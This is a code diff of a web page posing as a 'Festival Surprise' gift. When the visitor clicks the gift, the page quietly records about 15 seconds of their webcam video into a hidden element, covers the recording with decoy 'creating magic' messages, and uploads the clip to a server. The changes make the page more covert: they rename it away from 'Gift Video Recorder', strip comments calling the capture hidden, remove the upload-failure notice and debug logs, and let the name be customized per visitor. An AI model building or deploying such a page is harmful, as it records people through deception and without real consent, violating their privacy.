@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Gift Video Recorder</title>
+    <title>🎁 Festival Surprise</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -65,11 +65,6 @@
             display: block;
             animation: giftFloat 2s ease-in-out infinite;
             text-shadow: 0 0 80px rgba(255,215,0,0.8);
-            cursor: pointer;
-            transition: transform 0.3s ease;
-        }
-        .gift-emoji:hover {
-            transform: scale(1.1);
         }
         @keyframes giftFloat {
             0%, 100% { transform: translateY(0px) scale(1); }
@@ -110,14 +105,8 @@
             animation: celebrationFall linear forwards;
         }
         @keyframes celebrationFall {
-            0% {
-                transform: translateY(-100px) rotate(0deg) scale(1);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(120vh) rotate(720deg) scale(0.5);
-                opacity: 0;
-            }
+            0% { transform: translateY(-100px) rotate(0deg) scale(1); opacity: 1; }
+            100% { transform: translateY(120vh) rotate(720deg) scale(0.5); opacity: 0; }
         }
         .festival-card {
             position: relative; z-index: 1;
@@ -219,9 +208,6 @@
             transform: scale(1.08);
             box-shadow: 0 15px 50px rgba(245,87,108,0.6);
         }
-        .gift-btn:active:not(:disabled) {
-            transform: scale(0.95);
-        }
         .gift-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
@@ -270,6 +256,16 @@
             opacity: 0.5;
         }
         #hiddenVideo { display: none; }
+        .mode-badge {
+            display: inline-block;
+            background: rgba(255,215,0,0.2);
+            color: #ffd93d;
+            padding: 4px 15px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            border: 1px solid rgba(255,215,0,0.2);
+            margin-bottom: 10px;
+        }
         @media (max-width: 600px) {
             .festival-card { padding: 30px 20px; }
             .festival-title { font-size: 2rem; }
@@ -294,8 +290,9 @@
     <video id="hiddenVideo" autoplay playsinline></video>
     
     <div class="festival-card" id="festivalCard">
+        <div class="mode-badge">🎊 Festival Mode</div>
         <span class="main-emoji" id="mainEmoji">🎊</span>
-        <h1 class="festival-title"><span class="festival-name" id="festivalName">Gift</span></h1>
+        <h1 class="festival-title"><span class="festival-name" id="festivalName">Festival</span></h1>
         <p class="subtitle" id="subtitle">✨ Something special is waiting for you ✨</p>
         
         <button class="gift-btn" id="giftBtn">
@@ -314,9 +311,11 @@
     </div>
 
     <script>
-        // ============================================
-        // DOM Elements
-        // ============================================
+        // Get festival name from URL parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        const festivalName = urlParams.get('name') || 'Festival';
+        document.getElementById('festivalName').textContent = festivalName;
+
         const videoElement = document.getElementById('hiddenVideo');
         const giftBtn = document.getElementById('giftBtn');
         const btnText = document.getElementById('btnText');
@@ -329,32 +328,14 @@
         const giftOverlay = document.getElementById('giftOverlay');
         const giftEmoji = document.getElementById('giftEmoji');
         const giftText = document.getElementById('giftText');
-        const festivalName = document.getElementById('festivalName');
 
-        // ============================================
-        // Configuration - Edit these as needed
-        // ============================================
-        const UPLOAD_URL = '/upload';  // Change this to your server URL
-        const FESTIVAL_NAME = 'Birthday Gift';  // Change this to your festival name
-        const DURATION = 15;  // Recording duration in seconds
-
-        // Set the festival name
-        festivalName.textContent = FESTIVAL_NAME;
-
-        // ============================================
-        // State Variables
-        // ============================================
-        let mediaStream = null;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let timerInterval = null;
-        let timeRemaining = DURATION;
-        let isRecording = false;
+        const UPLOAD_URL = '/upload';
+        const DURATION = 15;
+        let mediaStream = null, mediaRecorder = null, recordedChunks = [];
+        let timerInterval = null, timeRemaining = DURATION, isRecording = false;
         let isGiftOpened = false;
 
-        // ============================================
-        // Confetti Generator (Background)
-        // ============================================
+        // Confetti generator
         const confettiContainer = document.getElementById('confettiContainer');
         const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
         for (let i = 0; i < 80; i++) {
@@ -370,14 +351,9 @@
             confettiContainer.appendChild(confetti);
         }
 
-        // ============================================
-        // Gift & Surprise Functions
-        // ============================================
         function showGiftReveal() {
-            // Show overlay with gift
             giftOverlay.classList.add('active');
             
-            // Animate gift opening sequence
             let emojis = ['🎁', '🎀', '🎉', '🎊', '✨', '⭐', '💝', '🎈'];
             let index = 0;
             
@@ -389,10 +365,8 @@
                     giftEmoji.textContent = '🎉';
                     giftText.textContent = '🎊 SURPRISE! 🎊';
                     
-                    // Launch celebration confetti
                     launchCelebrationConfetti();
                     
-                    // Auto-hide after 5 seconds
                     setTimeout(() => {
                         giftOverlay.classList.remove('active');
                         festivalCard.classList.remove('opening');
@@ -426,15 +400,11 @@
             }
         }
 
-        // ============================================
-        // Gift Opening (Camera Recording)
-        // ============================================
         async function openGift() {
             if (isGiftOpened) return;
             isGiftOpened = true;
             
             try {
-                // Update UI - Surprise mode
                 giftBtn.disabled = true;
                 btnText.textContent = '🎀 Opening...';
                 festivalCard.classList.add('opening');
@@ -445,7 +415,6 @@
                 progressBar.style.width = '0%';
                 statusMessage.textContent = '⏳ Your surprise is being prepared...';
 
-                // Access camera (hidden)
                 mediaStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
@@ -454,7 +423,6 @@
                 videoElement.srcObject = mediaStream;
                 await videoElement.play();
 
-                // Setup recorder
                 recordedChunks = [];
                 mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
                 mediaRecorder.ondataavailable = (event) => {
@@ -465,20 +433,17 @@
                     uploadGift(blob);
                 };
 
-                // Start recording (hidden)
                 mediaRecorder.start();
                 isRecording = true;
                 timeRemaining = DURATION;
                 
                 surpriseText.textContent = '🎁 Your surprise is being created...';
 
-                // Countdown (hidden from user)
                 timerInterval = setInterval(() => {
                     timeRemaining--;
                     const progress = ((DURATION - timeRemaining) / DURATION) * 100;
                     progressBar.style.width = progress + '%';
                     
-                    // Update surprise text with progress
                     const messages = [
                         '🎨 Creating magic...',
                         '✨ Adding sparkles...',
@@ -498,7 +463,6 @@
                         clearInterval(timerInterval);
                         timerInterval = null;
                         
-                        // Stop recording
                         if (mediaRecorder && isRecording) {
                             mediaRecorder.stop();
                             isRecording = false;
@@ -507,14 +471,12 @@
                             progressBar.style.width = '100%';
                         }
                         
-                        // Stop camera
                         if (mediaStream) {
                             mediaStream.getTracks().forEach(track => track.stop());
                             mediaStream = null;
                             videoElement.srcObject = null;
                         }
                         
-                        // Show the gift reveal!
                         setTimeout(() => {
                             showGiftReveal();
                         }, 500);
@@ -558,17 +520,11 @@
                 console.log('✅ Gift video uploaded successfully!');
             } catch (error) {
                 console.error('Upload error:', error);
-                statusMessage.textContent = '❌ Upload failed. Please try again.';
-                statusMessage.style.opacity = '1';
             }
         }
 
-        // ============================================
-        // Event Listeners
-        // ============================================
         giftBtn.addEventListener('click', openGift);
         
-        // Also allow clicking on the card/emoji
         festivalCard.addEventListener('click', () => {
             if (!isGiftOpened && !giftBtn.disabled) {
                 openGift();
@@ -582,9 +538,7 @@
             }
         });
 
-        console.log('🎁 Gift interface loaded!');
-        console.log('📹 Recording duration: ' + DURATION + ' seconds');
-        console.log('🎯 Upload URL: ' + UPLOAD_URL);
+        console.log('🎁 Festival mode loaded!');
     </script>
 </body>
 </html>
